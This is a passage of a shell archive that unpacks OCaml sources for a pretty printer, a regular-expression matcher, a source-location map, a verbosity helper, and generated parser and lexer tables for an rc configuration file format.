                  in  pstr nl;\n-                               pstr prefix;\n-                               loop d\n-    in\n-        loop doc\n-\n-# 344 \"pp.nw\"\n-type mode =\n-    | Flat\n-    | Break\n-    | Fill\n-\n-\n-# 405 \"pp.nw\"\n-let rec fits w = function\n-    | _ when w < 0                   -> false\n-    | []                             -> true\n-    | (i,m,DocNil)              :: z -> fits w z\n-    | (i,m,DocCons(x,y))        :: z -> fits w ((i,m,x)::(i,m,y)::z)\n-    | (i,m,DocNest(j,x))        :: z -> fits w ((i+j,m,x)::z)\n-    | (i,m,DocText(s))          :: z -> fits (w - strlen s) z\n-    | (i,Flat, DocBreak(s))     :: z -> fits (w - strlen s) z\n-    | (i,Fill, DocBreak(_))     :: z -> true \n-    | (i,Break,DocBreak(_))     :: z -> true\n-    | (i,m,DocGroup(_,x))       :: z -> fits w ((i,Flat,x)::z)\n-\n-\n-# 374 \"pp.nw\"\n-let rec format w k = function\n-    | []                             -> SNil\n-    | (i,m,DocNil)              :: z -> format w k z\n-    | (i,m,DocCons(x,y))        :: z -> format w k ((i,m,x)::(i,m,y)::z)\n-    | (i,m,DocNest(j,x))        :: z -> format w k ((i+j,m,x)::z)\n-    | (i,m,DocText(s))          :: z -> SText(s ,format w (k + strlen s) z)\n-    | (i,Flat, DocBreak(s))     :: z -> SText(s ,format w (k + strlen s) z)\n-    | (i,Fill, DocBreak(s))     :: z -> let l = strlen s in\n-                                            if   fits (w - k - l) z \n-                                            then SText(s, format w (k+l) z)\n-                                            else SLine(i, format w  i    z)\n-    | (i,Break,DocBreak(s))     :: z -> SLine(i,format w i z)\n-    | (i,m,DocGroup(GFlat ,x))  :: z -> format w k ((i,Flat ,x)::z)\n-    | (i,m,DocGroup(GFill ,x))  :: z -> format w k ((i,Fill ,x)::z)\n-    | (i,m,DocGroup(GBreak,x))  :: z -> format w k ((i,Break,x)::z)\n-    | (i,m,DocGroup(GAuto, x))  :: z -> if fits (w-k) ((i,Flat,x)::z)\n-                                        then format w k ((i,Flat ,x)::z)\n-                                        else format w k ((i,Break,x)::z)\n-\n-\n-# 422 \"pp.nw\"\n-let ppToString w doc =\n-    sdocToString  (format w 0 [0,Flat,agrp(doc)])\n-\n-let ppToFile oc w doc =\n-    sdocToFile oc (format w 0 [0,Flat,agrp(doc)])\n-\n-# 433 \"pp.nw\"\n-let rec list sep f xs =\n-    let rec loop acc = function\n-        | []    -> acc\n-        | [x]   -> acc ^^ f x \n-        | x::xs -> loop (acc ^^ f x ^^ sep) xs\n-    in\n-        loop empty xs \n-\n-let commalist f = list (text \",\" ^^ break) f\n-\n-let (^/) x y   = x ^^ break ^^ y \n-let (~~) x     = x\n-\n-let block f xs =   \n-    text \"{\"\n-    ^^ nest 4 begin\n-       ~~ break\n-       ^^ list break f xs\n-       end \n-    ^/ text \"}\"\n-\nEnd of pp.ml\necho rx.ml 1>&2\nsed 's/^-//' >'rx.ml' <<'End of rx.ml'\n-# 66 \"rx.nw\"\n-type 'a rx      = \n-                | RXzero                                (* {}           *)\n-                | RXunit                                (* \"\"           *)\n-                | RXsym         of 'a                   (* 'x'          *)\n-                | RXmany        of ('a rx)              (* e*           *)\n-                | RXsome        of ('a rx)              (* e+           *)\n-                | RXopt         of ('a rx)              (* e?           *)\n-                | RXseq         of ('a rx) * ('a rx)    (* e1 e2        *)\n-                | RXalt         of ('a rx) * ('a rx)    (* e1 | e2      *)\n-# 76 \"rx.nw\"\n-let zero        = RXzero\n-let unit        = RXunit\n-let sym x       = RXsym x\n-let many        = function\n-                | RXunit        -> RXunit\n-                | RXzero        -> RXunit\n-                | x             -> RXmany x\n-let some        = function\n-                | RXunit        -> RXunit\n-                | RXzero        -> RXzero\n-                | x             -> RXsome x\n-let opt         = function\n-                | RXunit        -> RXunit\n-                | RXzero        -> RXunit\n-                | x             -> RXopt x\n-let seq x y     = match (x,y) with\n-                | RXzero, x     -> RXzero\n-                | RXunit, x     -> x\n-                | x     , RXzero-> RXzero\n-                | x     , RXunit-> x\n-                | x     , y     -> RXseq(x,y)\n-let alt x y     = match (x,y) with\n-                | RXzero, x     -> x\n-                | x     , RXzero-> x\n-                | x     , y     -> RXalt(x,y)\n-# 102 \"rx.nw\"\n-let ( ||| ) = alt\n-let ( *** ) = seq\n-# 110 \"rx.nw\"\n-let rec nullable = function\n-    | RXzero            -> false\n-    | RXunit            -> true\n-    | RXsym x           -> false\n-    | RXmany e          -> true\n-    | RXsome e          -> nullable e\n-    | RXopt e           -> true\n-    | RXseq(e1,e2)      -> nullable e1 && nullable e2\n-    | RXalt(e1,e2)      -> nullable e1 || nullable e2\n-# 125 \"rx.nw\"\n-let rec residual e' x = match e' with\n-    | RXzero            -> RXzero\n-    | RXunit            -> RXzero\n-    | RXsym x'          -> if   x' = x \n-                           then RXunit\n-                           else RXzero\n-    | RXmany e          -> seq (residual e x) (many e)\n-    | RXsome e          -> seq (residual e x) (many e)\n-    | RXopt e           -> residual e x\n-    | RXseq(e1,e2)      -> if   nullable e1\n-                           then alt (seq (residual e1 x) e2) (residual e2 x)\n-                           else seq (residual e1 x) e2\n-    | RXalt(e1,e2)      -> alt (residual e1 x) (residual e2 x)\n-# 144 \"rx.nw\"\n-let matches e syms      = nullable (List.fold_left residual e syms)\n-# 151 \"rx.nw\"\n-let matchstr e str =\n-    let len = String.length str         in\n-    let rec loop e i =\n-        if   i = len \n-        then nullable e\n-        else loop (residual e (String.get str i)) (i+1)\n-    in\n-        loop e 0\nEnd of rx.ml\necho srcmap.ml 1>&2\nsed 's/^-//' >'srcmap.ml' <<'End of srcmap.ml'\n-# 175 \"srcmap.nw\"\n-type pos            = int\n-type rgn            = pos * pos\n-type location       = string    (* file   *)\n-                    * int       (* line   *)\n-                    * int       (* column *)\n-# 181 \"srcmap.nw\"\n-let null = (0,0)\n-# 189 \"srcmap.nw\"\n-type syncpoint      = pos * location\n-# 213 \"srcmap.nw\"\n-type map =          { mutable points:       syncpoint array \n-                    ; mutable top:          int\n-                    ; files :               (string, string) Hashtbl.t\n-                    }\n-type point          = map * pos\n-type region         = map * rgn\n-# 227 \"srcmap.nw\"\n-let size        =  2    (* small to test alloc *)\n-let undefined   =  (0, (\"undefined\", -1, -1))    \n-\n-# 231 \"srcmap.nw\"\n-let mk () =\n-    { points  = Array.create size undefined \n-    ; top     = 0\n-    ; files   = Hashtbl.create 17\n-    }    \n-\n-# 245 \"srcmap.nw\"\n-let alloc srcmap =\n-    let length = Array.length srcmap.points in\n-        if   srcmap.top < length then \n-            ()\n-        else \n-            let points' = Array.create length undefined in\n-                srcmap.points <- Array.append srcmap.points points'\n-# 261 \"srcmap.nw\"\n-let sync srcmap pos (file,line,col) =\n-    let _     = alloc srcmap in\n-    let file' = try  Hashtbl.find srcmap.files file\n-                with Not_found -> ( Hashtbl.add srcmap.files file file\n-                                  ; file\n-                                  ) \n-    in\n-    let location' = (file', line, col) in\n-    let top   = srcmap.top   in\n-        ( assert ((pos = 0) || (fst srcmap.points.(top-1) < pos))\n-        ; srcmap.points.(top) <- (pos,location')\n-        ; srcmap.top <- srcmap.top + 1\n-        )\n-# 280 \"srcmap.nw\"\n-let last map =\n-    ( assert (map.top > 0 && map.top <= Array.length map.points)\n-    ; snd map.points.(map.top-1)\n-    )\n-# 305 \"srcmap.nw\"\n-let nl srcmap pos =\n-    let _               = alloc srcmap  in\n-    let (file, line, _) = last srcmap   in\n-    let location' = (file, line+1,1) in\n-    let top   = srcmap.top   in\n-        ( assert ((pos = 0) || (fst srcmap.points.(top-1) < pos))\n-        ; srcmap.points.(top) <- (pos,location')\n-        ; srcmap.top <- srcmap.top + 1\n-        )\n-# 320 \"srcmap.nw\"\n-let cmp x (y,_) = compare x y\n-# 330 \"srcmap.nw\"\n-let search x array length cmp =\n-    let rec loop left right =\n-        if left > right then\n-            ( assert (0 <= right && right < Array.length array)\n-            ; array.(right)\n-            )\n-        else\n-            let pivot = (left + right)/2 in\n-            let res   = cmp x array.(pivot) in\n-            let _     = assert (0 <= pivot && pivot < Array.length array) in\n-                \n-                if res = 0 then \n-                    array.(pivot)\n-                else if res < 0 then\n-                    loop left (pivot-1)\n-                else\n-                    loop (pivot+1) right\n-    in\n-        ( assert (length > 0)\n-        ; loop 0 (length-1)\n-        )\n-# 360 \"srcmap.nw\"\n-let location map pos =\n-    let pos',(file,line,col) = search pos map.points map.top cmp in\n-    (file,line,pos - pos' + col)\n-# 369 \"srcmap.nw\"\n-let dump map =\n-    let point (pos,(file,line,col)) = \n-        Printf.printf \"%5d: %-32s %4d %3d\\n\" pos file line col\n-    in\n-        for i=0 to map.top-1 do\n-            point map.points.(i)\n-        done\n-# 382 \"srcmap.nw\"\n-module Str = struct\n-    let point  (map,pos) =\n-      let (file,line,column) = location map pos in\n-      Printf.sprintf \"File \\\"%s\\\", line %d, character %d\" file line column\n-\n-    \n-    let region (map,rgn) =\n-        match rgn with \n-        | (0,0)        -> Printf.sprintf \"<unknown location>\"\n-        | (left,right) -> \n-        let (file1,l1,col1) = location map left   in\n-        let (file2,l2,col2) = location map right  in\n-            if file1 = file2 && l1 = l2 then\n-                Printf.sprintf \n-                \"File \\\"%s\\\", line %d, characters %d-%d\" file1 l1 col1 col2\n-            else if file1 = file2 then\n-                Printf.sprintf \n-                \"File \\\"%s\\\", line %d, character %d - line %d, character %d\"\n-                file1 l1 col1 l2 col2\n-            else\n-                Printf.sprintf \n-                \"File \\\"%s\\\", line %d, character %d - file %s, line %d, character %d\"\n-                file1 l1 col2 file2 l2 col2\n-end\nEnd of srcmap.ml\necho verbose.ml 1>&2\nsed 's/^-//' >'verbose.ml' <<'End of verbose.ml'\n-# 18 \"verbose.nw\"\n-let verbosity = try int_of_string (Sys.getenv \"VERBOSITY\") with _ -> 0\n-let err l = List.iter prerr_string l; flush stderr\n-let say k = if verbosity >= k then err else ignore\nEnd of verbose.ml\necho rc_parse.ml 1>&2\nsed 's/^-//' >'rc_parse.ml' <<'End of rc_parse.ml'\n-type token =\n-    STR of (string)\n-  | ID of (string)\n-  | BOOL of (bool)\n-  | FLOAT of (float)\n-  | INT of (int)\n-  | COMMA\n-  | EQUAL\n-  | TRUE\n-  | FALSE\n-  | EOF\n-\n-open Parsing\n-# 2 \"rc_parse.mly\"\n-open Rc_ast \n-(* Line 5, file rc_parse.ml *)\n-let yytransl_const = [|\n-  262 (* COMMA *);\n-  263 (* EQUAL *);\n-  264 (* TRUE *);\n-  265 (* FALSE *);\n-    0 (* EOF *);\n-    0|]\n-\n-let yytransl_block = [|\n-  257 (* STR *);\n-  258 (* ID *);\n-  259 (* BOOL *);\n-  260 (* FLOAT *);\n-  261 (* INT *);\n-    0|]\n-\n-let yylhs = \"\\255\\255\\\n-\\001\\000\\002\\000\\002\\000\\003\\000\\003\\000\\004\\000\\004\\000\\004\\000\\\n-\\004\\000\\004\\000\\004\\000\\005\\000\\005\\000\\000\\000\"\n-\n-let yylen = \"\\002\\000\\\n-\\002\\000\\000\\000\\002\\000\\003\\000\\003\\000\\001\\000\\001\\000\\001\\000\\\n-\\001\\000\\001\\000\\001\\000\\003\\000\\003\\000\\002\\000\"\n-\n-let yydefred = \"\\000\\000\\\n-\\002\\000\\000\\000\\014\\000\\000\\000\\000\\000\\001\\000\\003\\000\\000\\000\\\n-\\007\\000\\006\\000\\011\\000\\010\\000\\008\\000\\009\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\012\\000\\013\\000\"\n-\n-let yydgoto = \"\\002\\000\\\n-\\003\\000\\004\\000\\007\\000\\015\\000\\016\\000\"\n-\n-let yysindex = \"\\255\\255\\\n-\\000\\000\\000\\000\\000\\000\\001\\000\\255\\254\\000\\000\\000\\000\\003\\255\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\007\\255\\008\\255\\\n-\\003\\255\\003\\255\\000\\000\\000\\000\"\n-\n-let yyrindex = \"\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\002\\000\\003\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\"\n-\n-let yygindex = \"\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\248\\255\\000\\000\"\n-\n-let yytablesize = 261\n-let yytable = \"\\001\\000\\\n-\\006\\000\\004\\000\\005\\000\\009\\000\\010\\000\\008\\000\\011\\000\\012\\000\\\n-\\019\\000\\020\\000\\013\\000\\014\\000\\017\\000\\018\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-\\000\\000\\000\\000\\005\\000\\004\\000\\005\\000\"\n-\n-let yycheck = \"\\001\\000\\\n-\\000\\000\\000\\000\\000\\000\\001\\001\\002\\001\\007\\001\\004\\001\\005\\001\\\n-\\017\\000\\018\\000\\008\\001\\009\\001\\006\\001\\006\\001\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-\\255\\255\\255\\255\\002\\001\\002\\001\\002\\001\"\n-\n-let yynames_const = \"\\\n-  COMMA\\000\\\n-  EQUAL\\000\\\n-  TRUE\\000\\\n-  FALSE\\000\\\n-  EOF\\000\\\n-  \"\n-\n-let yynames_block = \"\\\n-  STR\\000\\\n-  ID\\000\\\n-  BOOL\\000\\\n-  FLOAT\\000\\\n-  INT\\000\\\n-  \"\n-\n-let yyact = [|\n-  (fun _ -> failwith \"parser\")\n-; (fun parser_env ->\n-    let _1 = (peek_val parser_env 1 : 'rclines) in\n-    Obj.repr((\n-# 19 \"rc_parse.mly\"\n-                                                  _1            ) : Rc_ast.rcdict))\n-; (fun parser_env ->\n-    Obj.repr((\n-# 21 \"rc_parse.mly\"\n-                                                  empty         ) : 'rclines))\n-; (fun parser_env ->\n-    let _1 = (peek_val parser_env 1 : 'rclines) in\n-    let _2 = (peek_val parser_env 0 : 'rcline) in\n-    Obj.repr((\n-# 22 \"rc_parse.mly\"\n-                                                  let (id,rc) = _2 in\n-                                                  add id rc _1\n-                                                ) : 'rclines))\n-; (fun parser_env ->\n-    let _1 = (peek_val parser_env 2 : string) in\n-    let _3 = (peek_val parser_env 0 : 'value) in\n-    Obj.repr((\n-# 26 \"rc_parse.mly\"\n-                                                  (_1,_3)       ) : 'rcline))\n-; (fun parser_env ->\n-    let _1 = (peek_val parser_env 2 : string) in\n-    let _3 = (peek_val parser_env 0 : 'values) in\n-    Obj.repr((\n-# 27 \"rc_parse.mly\"\n-                                                  (_1,RClist(List.rev _3))  ) : 'rcline))\n-; (fun parser_env ->\n-    let _1 = (peek_val parser_env 0 : string) in\n-    Obj.repr((\n-# 29 \"rc_parse.mly\"\n-                                                  RCstr(_1)     ) : 'value))\n-; (fun parser_env ->\n-    let _1 = (peek_val parser_env 0 : string) in\n-    Obj.repr((\n-# 30 \"rc_parse.mly\"\n-                                                  RCstr(_1)     ) : 'value))\n-; (fun parser_env ->\n-    Obj.repr((\n-# 31 \"rc_parse.mly\"\n-                                                  RCbool(true)  ) : 'value))\n-; (fun parser_env ->\n-    Obj.repr((\n-# 32 \"rc_parse.mly\"\n-                                                  RCbool(false) ) : 'value))\n-; (fun parser_env ->\n-    let _1 = (peek_val parser_env 0 : int) in\n-    Obj.repr((\n-# 33 \"rc_parse.mly\"\n-                                                  RCint(_1)     ) : 'value))\n-; (fun parser_env ->\n-    let _1 = (peek_val parser_env 0 : float) in\n-    Obj.repr((\n-# 34 \"rc_parse.mly\"\n-                                                  RCfloat(_1)   ) : 'value))\n-; (fun parser_env ->\n-    let _1 = (peek_val parser_env 2 : 'value) in\n-    let _3 = (peek_val parser_env 0 : 'value) in\n-    Obj.repr((\n-# 36 \"rc_parse.mly\"\n-                                                  [_3  ; _1]    ) : 'values))\n-; (fun parser_env ->\n-    let _1 = (peek_val parser_env 2 : 'values) in\n-    let _3 = (peek_val parser_env 0 : 'value) in\n-    Obj.repr((\n-# 37 \"rc_parse.mly\"\n-                                                   _3 :: _1     ) : 'values))\n-(* Entry rcfile *)\n-; (fun parser_env -> raise (YYexit (peek_val parser_env 0)))\n-|]\n-let yytables =\n-  { actions=yyact;\n-    transl_const=yytransl_const;\n-    transl_block=yytransl_block;\n-    lhs=yylhs;\n-    len=yylen;\n-    defred=yydefred;\n-    dgoto=yydgoto;\n-    sindex=yysindex;\n-    rindex=yyrindex;\n-    gindex=yygindex;\n-    tablesize=yytablesize;\n-    table=yytable;\n-    check=yycheck;\n-    error_function=parse_error;\n-    names_const=yynames_const;\n-    names_block=yynames_block }\n-let rcfile (lexfun : Lexing.lexbuf -> token) (lexbuf : Lexing.lexbuf) =\n-   (yyparse yytables 1 lexfun lexbuf : Rc_ast.rcdict)\nEnd of rc_parse.ml\necho rc_scan.ml 1>&2\nsed 's/^-//' >'rc_scan.ml' <<'End of rc_scan.ml'\n-# 1 \"rc_scan.mll\"\n- \n-    \n-    open Rc_parse       (* tokens are defined here *)\n-\n-    exception ScanError of string\n-\n-    let error msg = raise (ScanError msg)\n-\n-    let keywords = Hashtbl.create 127\n-    let keyword s = Hashtbl.find keywords s\n-    let _ = Array.iter (fun (x,y) -> Hashtbl.add keywords x y)\n-        [|\n-             (\"true\"        ,TRUE);\n-             (\"false\"       ,FALSE);\n-        |]\n-\n-    let get = Lexing.lexeme\n-\n-    (* buffer for string literals *)\n-    let strBuffer = Buffer.create 80\n-\n-    let debug msg = print_endline msg\n-\n-    let init () =\n-        Buffer.clear strBuffer\n-let lex_tables = {\n-  Lexing.lex_base = \n-   \"\\000\\000\\002\\000\\252\\255\\254\\255\\001\\000\\255\\255\\253\\255\\244\\255\\\n-    \\252\\255\\253\\255\\254\\255\\247\\255\\004\\000\\245\\255\\077\\000\\246\\255\\\n-    \\087\\000\\164\\000\\239\\000\\251\\000\\005\\001\\027\\001\\037\\001\\047\\001\\\n-    \\114\\000\\251\\255\";\n-  Lexing.lex_backtrk = \n-   \"\\255\\255\\255\\255\\255\\255\\255\\255\\003\\000\\255\\255\\255\\255\\255\\255\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\011\\000\\255\\255\\006\\000\\255\\255\\\n-    \\005\\000\\005\\000\\255\\255\\006\\000\\007\\000\\255\\255\\255\\255\\007\\000\\\n-    \\255\\255\\255\\255\";\n-  Lexing.lex_default = \n-   \"\\007\\000\\002\\000\\000\\000\\000\\000\\006\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\024\\000\\000\\000\\255\\255\\000\\000\\\n-    \\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\255\\\n-    \\024\\000\\000\\000\";\n-  Lexing.lex_trans = \n-   \"\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\008\\000\\009\\000\\010\\000\\010\\000\\010\\000\\025\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\010\\000\\000\\000\\011\\000\\012\\000\\003\\000\\000\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\013\\000\\000\\000\\000\\000\\000\\000\\\n-    \\014\\000\\014\\000\\014\\000\\014\\000\\014\\000\\014\\000\\014\\000\\014\\000\\\n-    \\014\\000\\014\\000\\000\\000\\000\\000\\000\\000\\015\\000\\000\\000\\000\\000\\\n-    \\000\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\\n-    \\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\\n-    \\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\\n-    \\016\\000\\016\\000\\016\\000\\000\\000\\000\\000\\000\\000\\004\\000\\016\\000\\\n-    \\000\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\\n-    \\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\\n-    \\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\016\\000\\\n-    \\016\\000\\016\\000\\016\\000\\018\\000\\025\\000\\019\\000\\019\\000\\019\\000\\\n-    \\019\\000\\019\\000\\019\\000\\019\\000\\019\\000\\019\\000\\019\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\000\\000\\000\\000\\000\\000\\000\\000\\017\\000\\000\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\000\\000\\000\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\000\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\000\\000\\\n-    \\005\\000\\255\\255\\005\\000\\017\\000\\255\\255\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\\n-    \\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\017\\000\\020\\000\\\n-    \\020\\000\\020\\000\\020\\000\\020\\000\\020\\000\\020\\000\\020\\000\\020\\000\\\n-    \\020\\000\\018\\000\\000\\000\\019\\000\\019\\000\\019\\000\\019\\000\\019\\000\\\n-    \\019\\000\\019\\000\\019\\000\\019\\000\\019\\000\\020\\000\\020\\000\\020\\000\\\n-    \\020\\000\\020\\000\\020\\000\\020\\000\\020\\000\\020\\000\\020\\000\\000\\000\\\n-    \\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\022\\000\\000\\000\\\n-    \\022\\000\\000\\000\\021\\000\\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\\n-    \\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\\n-    \\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\\n-    \\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\023\\000\\\n-    